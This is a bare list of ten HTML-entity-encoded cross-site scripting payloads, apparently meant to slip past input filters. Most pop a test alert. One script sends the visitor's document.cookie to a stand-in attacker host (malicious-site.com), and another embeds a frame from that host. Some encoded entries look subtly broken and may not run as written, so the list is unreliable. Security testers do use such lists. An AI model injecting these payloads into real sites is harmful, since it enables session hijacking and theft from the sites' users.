  #Encoded XSS Payloads:

	1.	<script>alert&#x28;'XSS'&#x29;;</script>
	2.	<img src&#x3D;&#x22;x&#x22; onerror&#x3D;&#x22;alert('XSS')&#x22;>
	3.	<svg onload&#x3D;&#x22;alert('XSS')&#x22;></svg>
	4.	<script>document.location&#x3D;&#x27;http://malicious-site.com/collect?data=&#x27;+document.cookie;</script>
	5.	<a href&#x3D;&#x22;javascript:alert('XSS')&#x22;>Click me</a>
	6.	<input type&#x3D;&#x22;text&#x22; value&#x3D;&#x22;&lt;script&gt;alert('XSS')&lt;/script&gt;&#x22;>
	7.	<iframe src&#x3D;&#x22;http://malicious-site.com&#x22;></iframe>
	8.	<body onload&#x3D;&#x22;alert('XSS')&#x22;>
	9.	<div style&#x3D;&#x22;background-image: url(javascript:alert('XSS'));&#x22;>Hello</div>
	10.	javascript&#x3A;alert('XSS')
